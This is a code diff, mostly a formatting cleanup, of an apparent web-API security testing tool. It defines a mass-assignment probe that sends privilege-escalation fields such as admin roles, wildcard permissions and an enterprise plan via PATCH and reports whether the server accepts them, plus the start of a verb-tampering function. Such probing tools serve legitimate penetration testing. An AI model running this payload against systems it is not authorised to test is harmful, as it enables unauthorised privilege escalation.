@@ -1,4 +1,3 @@
-
 import requests
 
 _T = (5, 20)
@@ -9,7 +8,17 @@ def _get(url, **kw):
     return requests.get(url, timeout=_T, headers=_UA, **kw)
 
 
-_INJECT = {"role": "admin", "isAdmin": True, "is_admin": True, "admin": True, "permissions": ["*"], "user_role": "administrator", "verified": True, "active": True, "plan": "enterprise"}
+_INJECT = {
+    "role": "admin",
+    "isAdmin": True,
+    "is_admin": True,
+    "admin": True,
+    "permissions": ["*"],
+    "user_role": "administrator",
+    "verified": True,
+    "active": True,
+    "plan": "enterprise",
+}
 
 
 def mass_assign_probe(url: str = "", method: str = "PATCH", token: str = "") -> str:
@@ -29,9 +38,11 @@ def mass_assign_probe(url: str = "", method: str = "PATCH", token: str = "") -> 
     if not changed:
         return f"No behavior change ({base.status_code} both) — fields likely ignored"
     echo = [k for k in _INJECT if f'"{k}"' in probe.text]
-    return (f"RESPONSE CHANGED: empty={base.status_code}/{len(base.text)}B vs inject={probe.status_code}/{len(probe.text)}B"
-            + (f"\nreflected fields: {echo}" if echo else "")
-            + "\nfetch your profile and check whether role/plan changed — silent acceptance = critical")
+    return (
+        f"RESPONSE CHANGED: empty={base.status_code}/{len(base.text)}B vs inject={probe.status_code}/{len(probe.text)}B"
+        + (f"\nreflected fields: {echo}" if echo else "")
+        + "\nfetch your profile and check whether role/plan changed — silent acceptance = critical"
+    )
 
 
 def verb_tamper(url: str = "") -> str:
